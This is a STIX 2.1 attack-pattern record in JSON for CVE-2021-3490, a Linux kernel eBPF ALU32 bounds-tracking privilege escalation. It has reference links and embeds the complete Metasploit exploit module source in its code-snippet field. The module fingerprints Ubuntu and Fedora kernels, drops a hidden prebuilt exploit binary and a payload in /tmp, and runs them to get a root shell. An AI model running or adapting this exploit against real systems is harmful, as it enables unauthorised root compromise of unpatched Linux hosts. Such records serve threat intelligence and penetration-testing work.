{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4274c3d2-13fe-4012-8be4-ea23b1796107",
    "created": "2024-08-14T16:58:31.034294Z",
    "modified": "2024-08-14T16:58:31.034298Z",
    "name": "Linux eBPF ALU32 32-bit Invalid Bounds Tracking LPE",
    "description": " Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and 5.10.37 are vulnerable to a bug in the eBPF verifier's verification of ALU32 operations in the scalar32_min_max_and function when performing AND operations, whereby under certain conditions the bounds of a 32 bit register would not be properly updated.  This can be abused by attackers to conduct an out of bounds read and write in the Linux kernel and therefore achieve arbitrary code execution as the root user.  The target system must be compiled with eBPF support and not have kernel.unprivileged_bpf_disabled set, which prevents unprivileged users from loading eBPF programs into the kernel. Note that if kernel.unprivileged_bpf_disabled is enabled this module can still be utilized to bypass protections such as SELinux, however the user must already be logged as a privileged user such as root.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe.rb",
            "external_id": "cve_2021_3490_ebpf_alu32_bounds_check_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-3490"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2021/05/11/11"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e"
        },
        {
            "source_name": "reference",
            "url": "https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/advisories/ZDI-21-606/"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/notices/USN-4950-1"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/notices/USN-4949-1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux eBPF ALU32 32-bit Invalid Bounds Tracking LPE',\n        'Description' => %q{\n          Linux kernels from 5.7-rc1 prior to 5.13-rc4, 5.12.4, 5.11.21, and\n          5.10.37 are vulnerable to a bug in the eBPF verifier's verification\n          of ALU32 operations in the scalar32_min_max_and function when performing\n          AND operations, whereby under certain conditions the bounds of a\n          32 bit register would not be properly updated.\n\n          This can be abused by attackers to conduct an out of bounds read\n          and write in the Linux kernel and therefore achieve arbitrary\n          code execution as the root user.\n\n          The target system must be compiled with eBPF support and not have\n          kernel.unprivileged_bpf_disabled set, which prevents unprivileged\n          users from loading eBPF programs into the kernel. Note that if\n          kernel.unprivileged_bpf_disabled is enabled this module can still be\n          utilized to bypass protections such as SELinux, however the user\n          must already be logged as a privileged user such as root.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Manfred Paul', # Aka @_manfp, original vulnerability discovery\n          'chompie1337', # Exploit writeup and PoC\n          'Grant Willcox' # Aka @tekwizz123, Metasploit Module\n        ],\n        'DisclosureDate' => '2021-05-11',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2021-3490' ],\n          [ 'URL', 'https://www.openwall.com/lists/oss-security/2021/05/11/11' ],\n          [ 'URL', 'https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490' ], # Original PoC\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification' ], # Discussess the techniques used to gain arbitrary R/W in kernel.\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e' ],\n          [ 'URL', 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' ],\n          [ 'URL', 'https://www.zerodayinitiative.com/advisories/ZDI-21-606/' ],\n          [ 'URL', 'https://ubuntu.com/security/notices/USN-4950-1' ],\n          [ 'URL', 'https://ubuntu.com/security/notices/USN-4949-1' ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_OS_DOWN ],\n          'SideEffects' => [ ]\n        },\n        'DefaultTarget' => 0\n      )\n    )\n    register_options([\n      OptInt.new('CmdTimeout', [true, 'Maximum number of seconds to wait for the exploit to complete', 120])\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    arch = kernel_hardware\n\n    # Could we potentially support x86? Yes, potentially. Will we? Well considering the 5.7 kernel was released\n    # in 2020 and official support for x64 kernels ended in 2012 with\n    # https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=743aa456c1834f76982af44e8b71d1a0b2a82e2\n    # combined with the fact that those distros that do have older x86 versions mostly have 4.x or older kernels,\n    # and 90% of them have dropped support for x86 kernels a while back, we'll just assume that if its x86, its probably not\n    # running an affected Linux kernel.\n    unless arch.include?('x86_64')\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n\n    if unprivileged_bpf_disabled?\n      return CheckCode::Safe('Unprivileged BPF loading is not permitted')\n    end\n\n    vprint_good('Unprivileged BPF loading is permitted')\n\n    release = kernel_release\n    version = kernel_version\n\n    # If the target is Ubuntu...\n    if version =~ /[uU]buntu/\n      version_array = release.split('-')\n      if version_array.length < 2\n        fail_with(Failure::UnexpectedReply, 'The target Ubuntu server does not have the expected kernel version format!')\n      end\n      major_version = version_array[0]\n      minor_version = version_array[1]\n\n      # First check if we are past the 5.11.x kernel releases and into at the time of\n      # writing beta versions of Ubuntu. If so,the target isn't vuln.\n      if Rex::Version.new(major_version) >= Rex::Version.new('5.12.0')\n        return CheckCode::Safe(\"Target Ubuntu kernel version is #{major_version}-#{minor_version} which is not vulnerable!\")\n      elsif (Rex::Version.new(major_version) == Rex::Version.new('5.11.0')) && (Rex::Version.new(minor_version) >= Rex::Version.new('17.18'))\n        return CheckCode::Safe('Target Ubuntu kernel version is running a 5.11.x build however it has updated to a patched version!')\n      elsif (Rex::Version.new(major_version) == Rex::Version.new('5.8.0')) && (Rex::Version.new(minor_version) >= Rex::Version.new('53.60'))\n        return CheckCode::Safe('Target Ubuntu kernel version is running a 5.8.x build however it has updated to a patched version!')\n      elsif (Rex::Version.new(major_version) != Rex::Version.new('5.8.0')) && (Rex::Version.new(major_version) != Rex::Version.new('5.11.0')) # Only Ubuntu 20.04.02, Groovy, and Hirsuite are affected, other releases used a kernel either too old or which was patched.\n        return CheckCode::Unknown('Unknown target kernel version, recommend manually checking if target kernel is vulnerable.')\n      end\n    elsif release =~ /\\.fc3[2,3,4]\\./\n      version_array = release.split('-')\n      if version_array.length < 2\n        fail_with(Failure::UnexpectedReply, 'The target Fedora server does not have the expected kernel version format!')\n      end\n      major_version = version_array[0]\n      if version_array[1].split('.').length != 3\n        fail_with(Failure::UnexpectedReply, 'The target Fedora server does not have the expected minor kernel version format!')\n      end\n      minor_version = version_array[1].split('.')[0]\n      if Rex::Version.new(major_version) >= Rex::Version.new('5.11.20')\n        return CheckCode::Safe(\"Target Fedora kernel version is #{major_version}-#{minor_version} which is not vulnerable!\")\n      elsif Rex::Version.new(major_version) == Rex::Version.new('5.11.20') && Rex::Version.new(minor_version) >= Rex::Version.new('300')\n        return CheckCode::Safe('Target Fedora system is running a 5.11.20 kernel however it has been patched!')\n      elsif Rex::Version.new(major_version) <= Rex::Version.new('5.7')\n        return CheckCode::Safe('Running a Fedora system with a kernel before kernel version 5.7 where the vulnerability was introduced')\n      end\n    else\n      return CheckCode::Unknown(\"Target is not a known target, so we can't check if the target is vulnerable or not!\")\n    end\n\n    vprint_good(\"Kernel version #{release} appears to be vulnerable\")\n\n    config = kernel_config\n\n    if config.nil?\n      return CheckCode::Detected('Could not retrieve kernel config')\n    end\n\n    unless config.include?('CONFIG_BPF_SYSCALL=y')\n      return CheckCode::Safe('Kernel config does not include CONFIG_BPF_SYSCALL')\n    end\n\n    vprint_good('Kernel config has CONFIG_BPF_SYSCALL enabled')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    vprint_status('Dropping pre-compiled exploit on system...')\n    release = kernel_release\n    if release.split('-').length < 2\n      fail_with(Failure::UnexpectedReply, 'The target server does not have the expected kernel version format!')\n    end\n    major_version = release.split('-')[0]\n    if (Rex::Version.new(major_version) == Rex::Version.new('5.11.0')) && kernel_version =~ /[uU]buntu/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'hirsute.bin'))\n    elsif (Rex::Version.new(major_version) == Rex::Version.new('5.8.0')) && kernel_version =~ /[uU]buntu/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'groovy.bin'))\n    elsif release =~ /\\.fc3[2,3,4]\\./ && major_version =~ /5\\.7/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'fedora-5-7.bin'))\n    elsif release =~ /\\.fc3[2,3,4]\\./ && major_version =~ /5\\.8/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'fedora-5-8.bin'))\n    elsif release =~ /\\.fc3[2,3,4]\\./ && major_version =~ /5\\.9/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'fedora-5-9.bin'))\n    elsif release =~ /\\.fc3[2,3,4]\\./ && major_version =~ /5\\.10/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'fedora-5-10.bin'))\n    elsif release =~ /\\.fc3[2,3,4]\\./ && major_version =~ /5\\.11/\n      upload_and_chmodx(executable_path, exploit_data('cve-2021-3490', 'fedora-5-11.bin'))\n    else\n      fail_with(Failure::NoTarget, 'The target OS cannot be targeted by this exploit. Considering submitting a PR to add support for this target!')\n    end\n    register_file_for_cleanup(executable_path)\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(payload_path, generate_payload_exe)\n    register_file_for_cleanup(payload_path)\n\n    # Launch exploit\n    print_status('Launching exploit...')\n    print_warning('Note that things may appear to hang due to the exploit not exiting.')\n    print_warning(\"Feel free to press CTRL+C if the shell is returned before #{datastore['CmdTimeout']} seconds are up.\")\n    response = cmd_exec(executable_path.to_s, payload_path.to_s, datastore['CmdTimeout'])\n    if response =~ /fail/\n      fail_with(Failure::NoTarget, 'The exploit failed! Check to see if you are running this against the right target and kernel version!')\n      vprint_error(\"The response was: #{response}\")\n    elsif response =~ /success!/\n      print_good('Exploit completed successfully, shell should be returning soon!')\n    else\n      print_status('No indication of exploit success or failure, try increasing CmdTimeout value!')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-11",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}